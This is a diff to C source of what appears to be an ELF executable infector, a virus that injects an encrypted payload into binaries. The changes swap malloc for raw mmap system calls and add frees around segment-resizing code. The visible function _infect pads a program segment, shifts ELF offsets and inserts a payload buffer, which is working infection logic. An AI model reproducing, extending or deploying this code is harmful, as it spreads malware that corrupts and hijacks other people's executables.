@@ -33,26 +33,26 @@ void encrypt(char *s, uint64_t n, uint32_t *k){
 
 static int _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2){
 	char *ns;
-	if ((ns = (char *)malloc((*n1) + n2)) == NULL)
-		return FALSE;
-	//ns = (void*)CALL(MMAP, NULL, (*n1) + n2, 6, 34, -1, 0);
-	//if (SYS_HAVE_FAIL(ns))
+	//if ((ns = (char *)malloc((*n1) + n2)) == NULL)
 	//	return FALSE;
+	ns = (void*)CALL(MMAP, NULL, (*n1) + n2, 6, 34, -1, 0);
+	if (SYS_HAVE_FAIL(ns))
+		return FALSE;
 	size_t i,j,l;
 	for (i = 0; i <= pos; i += 1){ ns[i] = (*s1)[i]; }
 	for (j = 0; j < n2; j += 1){ns[i+j] = s2[j]; }
 	for (l = 0; i+l < *n1; l += 1){ ns[i+j+l] = (*s1)[i+l]; }
-	//ffree(*s1, *n1);
+	ffree(*s1, *n1);
 	*s1 = ns;
 	*n1 = (*n1) + n2;
 	return TRUE;
 }
 
 static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
-	char *ns = (char *)malloc((*n) + add);
-	//char *ns = (void*)CALL(MMAP, NULL, (*n) + add, 6, 34, -1, 0);
-	//if (SYS_HAVE_FAIL(ns))
-	//	return ; // TODO
+	//char *ns = (char *)malloc((*n) + add);
+	char *ns = (void*)CALL(MMAP, NULL, (*n) + add, 6, 34, -1, 0);
+	if (SYS_HAVE_FAIL(ns))
+		return ; // TODO
 	size_t i,j,l;
 	for (i = 0; i <= pos; i += 1){ ns[i] = (*s)[i]; }
 	for (j = 0; j < add; j += 1){ns[i+j] = 0; }
@@ -93,6 +93,8 @@ static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, si
 	size_t diff = ph[x].p_memsz - ph[x].p_filesz;
 	if (diff > 0){
 		//it means the segment will get bigger in mem, but we don't need that so we make it bigger in the file
+		size_t oldn = *n;
+		char *olds = *s;
 		_insert_zeros(s,n, ph[x].p_offset+ph[x].p_filesz, diff);
 		elf_shift_offset(*s, *n, ph[x].p_offset+ph[x].p_filesz, diff);
 		//reset it
@@ -101,6 +103,7 @@ static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, si
 		//change memsize to filesize
 		ph[x].p_filesz += diff;
 		ph[x].p_memsz = ph[x].p_filesz;
+		ffree(olds, oldn);
 	}
 	size_t pos = ph[x].p_offset + ph[x].p_filesz;
 	_insert(s, n, pos, b, bn);
